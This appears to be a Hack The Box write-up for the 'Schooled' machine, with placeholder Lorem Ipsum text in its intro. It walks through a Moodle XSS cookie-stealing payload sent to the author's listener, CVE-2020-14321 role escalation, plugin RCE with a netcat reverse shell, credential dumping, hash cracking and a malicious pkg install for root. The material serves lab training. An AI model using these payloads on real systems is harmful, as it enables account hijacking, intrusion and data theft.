---
layout: single
title: Schooled - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-05-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-schooled/schooled_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-schooled/schooled_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/schooled]# nmap -Pn -n -sCV --open 10.10.10.234                                                                    (master✱)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey:
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

DIRB:
==> DIRECTORY: http://10.10.10.234/css/
==> DIRECTORY: http://10.10.10.234/fonts/
==> DIRECTORY: http://10.10.10.234/images/
+ http://10.10.10.234/index.html (CODE:200|SIZE:20750)
==> DIRECTORY: http://10.10.10.234/js/

NIKTO:
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE

[root:/git/htb/schooled]# nmap -p- --open 10.10.10.234                                                                            (master✱)
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  33060/tcp open  mysqlx

[root:/git/htb/schooled]# nmap -sU 10.10.10.234                                                                                   (master✱)
  PORT    STATE         SERVICE
  514/udp open|filtered syslog


2. We have a point of entry is through port 33060, mysqlx through services such as mysql-shell.
Install snap and the snap package 'mysql-shell'.

[root:~]# systemctl start snapd.service
[root:~]# systemctl status snapd.service
[root:~]# snap install mysql-shell
  mysql-shell 8.0.23 from Canonical✓ installed

[root:~]# /bin/bash
root@nidus:~# mysqlsh
  MySQL Shell 8.0.23

  Type '\help' or '\?' for help; '\quit' to exit.
  mysql-py> \c root@schooled.htb
    Creating a session to 'root@schooled.htb'
    Please provide the password for 'root@schooled.htb': ****
    MySQL Error 1045: Access denied for user 'root'@'10.10.14.8' (using password: YES)

We lack any credentials however, so continue to enumerate.

Enumerate vhosts with gobuster:
  [root:/git/htb/schooled]# gobuster vhost -v -u http://schooled.htb -w /usr/share/wordlists/dirb/big.txt -o go-vhosts.txt
  [root:/git/htb/schooled]#  cat go-vhosts.txt | grep Found:
    Found: moodle.schooled.htb (Status: 200) [Size: 84]

While waiting for the results I found this interesting sentence on the homepage; 'All content will be delivered over Moodle.'
Add moodle.schooled.htb in /etc/hosts.


3. Create a new account.

Username: testtest
Password: Test123!
Email: testtest@student.schooled.htb

We have the option to upload files, however it seem like we can't execute them server side. Trying to access the uploaded file
automatically trigger a download.

Enroll to Mathematics course, from the announcements we find:
  > This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.
  > Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.
  > Look forward to seeing you all soon.
  > Manuel Phillips

Going to our profile, and clicking 'Edit Profile' we have the option to specify 'MoodleNet profile', we can probably use
this to create steal Manuel Phillips admin cookie.

MoodleNet Profile: <script> document.write('<img src="http://10.10.14.8?c='+document.cookie+'" />'); </script>

[root:/git/htb/schooled]# nc -lvnp 80                                                                                             (master✱)
  listening on [any] 80 ...
  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.234] 42693
  GET /?c=MoodleSession=rktqego8s482a68uaog926rpjl HTTP/1.1
  Host: 10.10.14.8
  User-Agent: Mozilla/5.0 (X11; FreeBSD amd64; rv:86.0) Gecko/20100101 Firefox/86.0
  Accept: image/webp,*/*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: keep-alive
  Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=29


Change to the new MoodleSession cookie (rktqego8s482a68uaog926rpjl) in the Storage Settings (Shift + F9), go to dashboard
to update and we are now logged in as Manuel Phillips.


4. Looking around for vulnerabilities as a teacher I came across CVE-2020-14321, where we can escalate the teacher to
a manager, and then upload a malicious plugin to get RCE. Sound good to me!

First we need to find the manager, this can we simply do by going to your course (Maths) and press 'Participants'.
In the top right we find a cog, press that and in the bottom of the drop-down-list you see the option 'Other Users'.
Looking at Other Users we find 'Lianne Carter' with the Role 'Manager (Assigned at site level)'.

Go back enroll Lianne as a new student for the maths class. Before you press 'Enroll user', start up Burp Suite
and capture the GET request - send it to the repeater.

ORIGINAL REQUEST:
  GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KdOADdOd7H&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=25&roletoassign=1&startdate=4&duration= HTTP/1.1
  Host: moodle.schooled.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/json
  X-Requested-With: XMLHttpRequest
  Connection: close
  Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5
  Cookie: MoodleSession=rktqego8s482a68uaog926rpjl

- Change the 'userlist'-parameter from 25 (ID of Lianne) to Manuel's ID, 24.
- Change the 'roletoassign' from 5, which I assume is student, to 1 - which is manager.
- Send the new request

MODIFIED REQUEST:
  GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=KdOADdOd7H&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=24&roletoassign=1&startdate=4&duration= HTTP/1.1
  Host: moodle.schooled.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/json
  X-Requested-With: XMLHttpRequest
  Connection: close
  Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5
  Cookie: MoodleSession=rktqego8s482a68uaog926rpjl

RESPONSE:
  HTTP/1.1 200 OK
  Date: Fri, 07 May 2021 13:47:06 GMT
  Server: Apache/2.4.46 (FreeBSD) PHP/7.4.15
  X-Powered-By: PHP/7.4.15
  Expires: Mon, 20 Aug 1969 09:23:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Cache-Control: post-check=0, pre-check=0
  Last-Modified: Fri, 07 May 2021 13:47:07 GMT
  Accept-Ranges: none
  Content-Length: 51
  Connection: close
  Content-Type: application/json; charset=utf-8

  {"success":true,"response":{},"error":"","count":1}

We get a success! We can now see in the list of Participants that we got both Lianne and Manuel as a Manager Role.

First / Surname	  Email address                         Roles               Groups      Last access to course
Lianne Carter	    carter_lianne@staff.schooled.htb	    Student, Manager 	  No groups	  Never
Manuel Phillips	  phillips_manuel@staff.schooled.htb	  Manager, Teacher 	  No groups	  now

Press on 'Lianne Carter' to go to her profile and within you'll find Administration and 'Log in as'. Press that and
you'll now have access as Lianne which gives us access to 'Site administration' in the left menu bar.


5. Going to 'Site administration' > Plugins we notice that we don't have any options available to upload a file.

Go to Users > Permission, Define Roles > Manager > Edit.
Scroll down in the list of options and enable 'Change site configuration'.

Go back to Site administration > Plugins and you'll now have 'Install plugins' as an option.

Download rce.zip from 'https://github.com/HoangKien1020/Moodle_RCE' and upload it, press 'Install plugin from ZIP file'.
Moodle will validate the file and you have to press 'Continue'.

The plugin should now be uploaded and installed. Quickly execute your exploit through the url as this is reset frequently.
[root:/git/htb/schooled]# curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php\?cmd\=id                        (master✱)
  uid=80(www) gid=80(www) groups=80(www)

Testing different one-line-reverse and I got netcat to work.

[root:/git/htb/schooled]# curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.8%204488%20%3E%2Ftmp%2Ff
[root:/git/htb/schooled]# nc -lvnp 4488                                                                                           (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.234] 45345
  sh: can't access tty; job control turned off
  $ id
    uid=80(www) gid=80(www) groups=80(www)
  $ pwd
    /usr/local/www/apache24/data/moodle/blocks/rce/lang/en


6. Lets start by looking for sensitive files. Moodle use MySQL to store it's userdata, so we can probably find a file
containing MySQL creds.

  $ pwd
    /usr/local/www/apache24/data/moodle

  $ cat config.php
    <?php  // Moodle configuration file

    $CFG->dbtype    = 'mysqli';
    $CFG->dblibrary = 'native';
    $CFG->dbhost    = 'localhost';
    $CFG->dbname    = 'moodle';
    $CFG->dbuser    = 'moodle';
    $CFG->dbpass    = 'PlaybookMaster2020';
    $CFG->prefix    = 'mdl_';
    $CFG->dboptions = array (
      'dbpersist' => 0,
      'dbport' => 3306,
      'dbsocket' => '',
      'dbcollation' => 'utf8_unicode_ci',
    );

We are unable to access mysql however;
$ mysql
  /bin/sh: mysql: not found

Looking in /etc/passwd we see that the users use '/bin/csh', so we change to that and are now able to access mysql.
mysql -D moodle -h localhost -u moodle -p
Enter password: PlaybookMaster2020


Dumping the database and looking on the table mdl_user we find the admin hash (jamie's hash), which is also on of our
available users.

mysqldump --databases moodle -h localhost -u moodle -p > out.txt
Enter password: PlaybookMaster2020

ls -al /usr/home
  total 26
  drwxr-xr-x   4 root   wheel   4 Mar 16 06:33 .
  drwxr-xr-x  16 root   wheel  16 Feb 26 22:46 ..
  drwx------   2 jamie  jamie  11 Feb 28 18:13 jamie
  drwx------   5 steve  steve  14 Mar 17 14:05 steve


[root:/git/htb/schooled]# cat mdl_user.txt | jamie
  'admin','$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW','','Jamie','Borham','jamie@staff.schooled.htb'


7. Crack the (blowfish) hash, SSH in as jamie and grab user.txt

[root:/git/htb/schooled]# hashcat -a0 -m3200 jamie.hash /usr/share/wordlists/rockyou.txt
  ..
  $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx

  Session..........: hashcat
  Status...........: Cracked
  Hash.Name........: bcrypt $2*$, Blowfish (Unix)

CREDS = jamie:!QAZ2wsx

  [root:/git/htb/schooled]# ssh jamie@schooled.htb
    Password for jamie@Schooled: !QAZ2wsx
    ..
    jamie@Schooled:~ $ id
      uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)

    jamie@Schooled:~ $ cat user.txt
      7cb596a361cac653fbbc1c75665b5011


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. As per usual we start with a 'sudo -l' hoping for a easy root.

  jamie@Schooled:~ $ sudo -l
    User jamie may run the following commands on Schooled:
        (ALL) NOPASSWD: /usr/sbin/pkg update
        (ALL) NOPASSWD: /usr/sbin/pkg install *

It is pretty obvious that we should install a package with sudo privs to get root.
Looking on gtfobins there's an entry about 'pkg', follow it and modify to get the contents of /root/root.txt.

  [root:/opt/htb/schooled]# gem install fpm
  [root:/git/htb/schooled]# TF=$(mktemp -d)                                                                                         (master✱)
  [root:/git/htb/schooled]# echo 'cat /root/root.txt' > $TF/x.sh                                                                    (master✱)
  [root:/git/htb/schooled]# fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF                                         (master✱)
    DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use #finish to prevent that.
    /var/lib/gems/2.7.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in `initialize'
    	/var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new'
    	/var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `block in output'
    	/var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open'
    	/var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `output'
    	/var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute'
    	/var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in `run'
    	/var/lib/gems/2.7.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run'
    	/var/lib/gems/2.7.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in `run'
    	/var/lib/gems/2.7.0/gems/fpm-1.12.0/bin/fpm:7:in `<top (required)>'
    	/usr/local/bin/fpm:23:in `load'
    	/usr/local/bin/fpm:23:in `<main>'
    Created package {:path=>"x-1.0.txz"}

  [root:/git/htb/schooled]# python3 -m http.server 80

  jamie@Schooled:~ $ curl http://10.10.14.12/x-1.0.txz --output x-1.0.txz
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100   472  100   472    0     0   6051      0 --:--:-- --:--:-- --:--:--  6051

  jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
    pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
    pkg: Repository FreeBSD cannot be opened. 'pkg update' required
    Checking integrity... done (0 conflicting)
    The following 1 package(s) will be affected (of 0 checked):

    New packages to be INSTALLED:
    	x: 1.0

    Number of packages to be installed: 1
    [1/1] Installing x-1.0...
    bdf19103f786cf0b8a3be335ba0fabdf
    Extracting x-1.0: 100%

Report the flag, done deal!


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


XSS Admin Cookie:
  https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/

Moodle Teacher to RCE:
  https://github.com/HoangKien1020/CVE-2020-14321
  https://www.youtube.com/watch?v=BkEInFI4oIU

Pkg privesc / root.txt:
  https://gtfobins.github.io/gtfobins/pkg/
